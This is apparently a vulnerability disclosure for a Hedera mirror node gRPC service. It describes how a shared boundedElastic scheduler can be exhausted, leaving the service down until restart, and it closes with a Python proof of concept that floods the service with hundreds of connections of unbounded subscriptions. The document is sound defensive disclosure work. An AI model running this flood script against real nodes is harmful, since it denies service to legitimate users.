### Title
Shared `boundedElastic()` Scheduler Exhaustion via Unbounded Connections Enables Persistent DoS on Topic Message Retrieval

### Summary
`PollingTopicMessageRetriever` is a Spring singleton that allocates exactly one `Schedulers.boundedElastic()` instance at construction time, shared across every concurrent subscription. Because `GrpcConfiguration` enforces only a per-connection call cap (`maxConcurrentCallsPerConnection = 5`) with no global connection or subscription limit, an unauthenticated attacker can open an arbitrary number of connections and saturate the shared thread pool. Critically, the `.timeout()` operator is wired to the same saturated scheduler, so stuck subscriptions never time out, making the exhaustion self-reinforcing and permanent until the process is restarted.

### Finding Description

**Code path and root cause**

`PollingTopicMessageRetriever` constructor (line 41):
```java
scheduler = Schedulers.boundedElastic();
```
This single scheduler instance is used in every call to `retrieve()` (lines 55 and 59):
```java
.repeatWhen(RepeatSpec.create(...)
    .withFixedDelay(context.getFrequency())
    .withScheduler(scheduler))          // line 55 – schedules inter-poll delays
...
.timeout(retrieverProperties.getTimeout(), scheduler)  // line 59 – schedules 60 s timeout
```

`Schedulers.boundedElastic()` defaults to a thread cap of `10 × CPU_cores` (e.g., 40 threads on a 4-core host) and a task queue of 100,000 entries. When the thread pool is fully occupied, newly submitted tasks queue; when the queue is full, tasks are rejected with `RejectedExecutionException`.

**Why the only guard is insufficient**

`GrpcConfiguration` (line 33) sets only:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
// default = 5
```
No `maxInboundConnections`, no authentication interceptor, and no global subscription counter with a hard cap exists anywhere in the gRPC server configuration or service layer. `TopicMessageServiceImpl` tracks `subscriberCount` as a metric gauge only — it is never used to reject new subscriptions.

**Exploit flow**

1. Attacker opens *N* TCP connections to port 5600 (no connection limit enforced).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` RPCs (the per-connection cap), each with `consensusStartTime = 0` and no `limit` or `endTime`, forcing `throttled = true` and `numRepeats = Long.MAX_VALUE`.
3. Each subscription enters `retrieve()`, which submits a poll task to the shared `boundedElastic()` scheduler every 2 seconds (default `pollingFrequency`). During each poll, `Flux.fromStream(topicMessageRepository.findByFilter(...))` executes synchronously on a bounded-elastic worker thread.
4. As *N* grows, all worker threads are occupied simultaneously during poll windows. With a 4-core host (40 threads) and a database query latency of ~50 ms, only ~1,600 concurrent subscriptions (320 connections) are needed to keep all threads busy continuously.
5. **Feedback loop via `.timeout()`**: The 60-second timeout that should evict idle attacker subscriptions is itself scheduled on the same saturated scheduler. When the pool is full, the timeout task is queued but never executed, so attacker subscriptions accumulate indefinitely.
6. **Feedback loop via `.retryWhen()`**: `Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1))` retries on any error, including `RejectedExecutionException` from the saturated scheduler. Each retry attempt re-submits to the same saturated pool, amplifying queue pressure.
7. Legitimate new subscriptions cannot schedule their first poll or timeout; they stall or receive `RejectedExecutionException` propagated as a gRPC `INTERNAL` error.

### Impact Explanation

All historical message retrieval for HCS topic subscriptions is routed through `PollingTopicMessageRetriever.retrieve()`. Once the shared scheduler is exhausted, no new subscriber — including legitimate consensus-message consumers — can receive historical topic messages. Because the timeout operator shares the same scheduler, the attacker's subscriptions are never evicted; the denial of service persists until the JVM is restarted or the attacker's connections are forcibly closed at the network layer. This constitutes a complete, persistent availability failure for the gRPC topic-subscription service with no self-healing capability.

### Likelihood Explanation

The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no payload crafting — only the ability to open TCP connections to port 5600 and issue `subscribeTopic` RPCs. The number of connections required (~320 on a 4-core host) is trivially achievable from a single machine or a small botnet. The attack is fully repeatable: after a restart, the attacker can immediately re-saturate the pool. Infrastructure-level mitigations (load balancer connection limits, firewall rules) may reduce exposure in some deployments, but none are enforced by the application itself.

### Recommendation

1. **Enforce a global subscription limit** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold, returning `RESOURCE_EXHAUSTED`.
2. **Set `maxInboundConnections`** in `GrpcConfiguration` via `serverBuilder.maxConnectionAge(...)` / `serverBuilder.maxInboundConnections(...)` to bound the total number of TCP connections.
3. **Decouple the timeout scheduler** from the poll scheduler: pass `Schedulers.parallel()` or a dedicated `ScheduledExecutorService` to `.timeout()` so that timeout enforcement is never blocked by poll-thread exhaustion.
4. **Cap the `boundedElastic()` queue** explicitly (via `Schedulers.newBoundedElastic(threadCap, queueSize, ...)`) and handle `RejectedExecutionException` by terminating the offending subscription rather than retrying on the same pool.
5. **Add per-IP or per-client-ID rate limiting** at the gRPC interceptor layer.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 400   # 400 connections × 5 calls = 2,000 subscriptions
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no endTime, no limit → throttled=true, numRepeats=MAX_VALUE
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.subscribeTopic(query)),
            daemon=True
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,), daemon=True)
           for i in range(CONNECTIONS)]
for w in workers:
    w.start()

# After ~30 seconds, attempt a legitimate subscription from a separate client.
# Expected result: subscription stalls or returns INTERNAL / RejectedExecutionException.
# The bounded-elastic pool is saturated; timeout tasks never fire on attacker subscriptions.
```
